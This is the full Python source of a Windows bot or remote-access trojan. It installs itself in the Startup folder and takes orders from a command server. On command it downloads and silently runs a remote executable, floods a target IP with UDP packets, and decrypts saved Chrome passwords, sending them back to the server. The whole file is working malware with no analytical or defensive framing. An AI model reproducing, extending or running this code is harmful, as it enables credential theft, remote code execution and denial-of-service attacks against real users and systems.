import socket
import threading
import time
import os
import sys
import shutil
import random
import multiprocessing
import subprocess
import base64
import sqlite3
import win32crypt
import json
import datetime
from Crypto.Cipher import AES

should_reconnect = True

host = ''
port = 443

def copy_to_startup_directory():
    try:
        # Get the current script's path
        script_path = os.path.abspath(sys.argv[0])

        # Determine the Startup directory for Windows
        startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

        # Copy the script to the Startup directory
        shutil.copy(script_path, os.path.join(startup_dir, os.path.basename(script_path)))

        print("Script copied to the Startup directory successfully.")
    except Exception as e:
        print(f"Error copying script to Startup directory: {e}")

    start_client()

def receive_messages(client_socket):
    global should_reconnect
    while should_reconnect:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break

            print(f"Received from server: {data}")

            # Check for disconnect messages
            if data == 'disconnect':
                print("Server has requested disconnect. Closing client...")
                should_reconnect = False  # Set the flag to False to prevent reconnection
                break
            elif data == 'disconnect_all':
                print("Server has requested all clients to disconnect. Closing client...")
                should_reconnect = False  # Set the flag to False to prevent reconnection
                break

            # Perform any action based on the received message
            if data == 'shell':
                rev_shell()

            if data.startswith('attack'):
                # Extract IP, threads, and timer from the received data
                _, ip, threads, timer, port = data.split()
                thread_attack(ip, int(threads), int(timer), int(port))

            if data == 'extract':
                print("Extracting Chrome Passwords...")
                extract_passwords()

        except Exception as e:
            print(f"Error in receive_messages: {e}")

    print("Server connection closed.")
    client_socket.close()

    # Add a delay before attempting to reconnect
    time.sleep(60)

def rev_shell():
    # URL where shell.exe is hosted
    url = f"http://{host}/shell.exe"
    
    # Construct the download path with environment variable for temp directory
    username = os.getenv('USERNAME')  # Get the current username
    download_path = fr'C:\Users\{username}\AppData\Local\Temp\shell.exe'

    # PowerShell command to download the executable to the specified path
    powershell_command = f'powershell -Command "(New-Object System.Net.WebClient).DownloadFile(\'{url}\', \'{download_path}\')"'

    # Execute the PowerShell command using os.system
    os.system(powershell_command)
    
    # Execute the downloaded executable from the specified path
    if os.path.exists(download_path):
        subprocess.Popen(download_path, creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        print(f"Failed to download or find {download_path}")

def start_client():
    while should_reconnect:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, port))

            print(f"Connected to {host}:{port}")

            # Start a thread to receive messages from the server
            receive_thread = threading.Thread(target=receive_messages, args=(client_socket,))
            receive_thread.start()

            receive_thread.join()  # Wait for the receive thread to finish

        except ConnectionRefusedError:
            print("Connection refused. Retrying in 5 seconds...")
            time.sleep(5)

def attack_worker(ip, timer, port):
    start_time = time.time()
    timeout = start_time + timer

    try:
        Bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        packets_sent = 0
        while time.time() < timeout:
            dport = port
            sock.sendto(Bytes * random.randint(2, 55), (ip, dport))
            packets_sent += 1

        end_time = time.time()
        elapsed_time = end_time - start_time
        packets_per_second = packets_sent / elapsed_time

        print(f"Attack completed. Sent {packets_sent} packets in {elapsed_time:.2f} seconds.")
        print(f"Average packets per second: {packets_per_second:.2f}")

    except Exception as Error:
        print(f"Error during attack: {Error}")

def thread_attack(ip, threads, timer, port):
    # Create a list to store the worker processes
    processes = []

    # Start processes for the attack
    for _ in range(0, threads):
        process = multiprocessing.Process(target=attack_worker, args=(ip, timer, port))
        process.start()
        processes.append(process)

    # Wait for all processes to finish or until the timeout is reached
    for process in processes:
        process.join()

    print("All attack processes completed.")

def send_file_to_server(filename):
    try:
        with open(filename, "rb") as f:
            file_content = f.read()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((host, port))
            client_socket.sendall(b"chrome_passwords.txt")  # Inform server about file type
            client_socket.sendall(file_content)
            print(f"Sent {filename} to server successfully.")
    except Exception as e:
        print(f"Error sending {filename} to server: {e}")

def convert_chrome_timestamp(chromedate):
    epoch_start = datetime.datetime(1601, 1, 1)
    delta_microseconds = datetime.timedelta(microseconds=chromedate)
    return epoch_start + delta_microseconds

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = file.read()
        local_state = json.loads(local_state)
    
    # decode the Base64 encryption key
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI prefix
    key = key[5:]
    # return decrypted key that was originally encrypted
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        print("Error decrypting password: ", e)
        return ""

def extract_passwords():
    # Your existing function to extract Chrome passwords
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    with open("chrome_passwords.txt", "w") as file:
        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            encrypted_password = row[2]
            decrypted_password = decrypt_password(encrypted_password, key)
            if username or decrypted_password:
                file.write(f"Origin URL: {origin_url}\n")
                file.write(f"Username: {username}\n")
                file.write(f"Password: {decrypted_password}\n")
                file.write("="*50 + "\n")
    
    cursor.close()
    db.close()
    os.remove(filename)
    print("Passwords extracted and saved to chrome_passwords.txt")

    # Send the extracted passwords file to the server
    send_file_to_server("chrome_passwords.txt")

if __name__ == "__main__":
    copy_to_startup_directory()
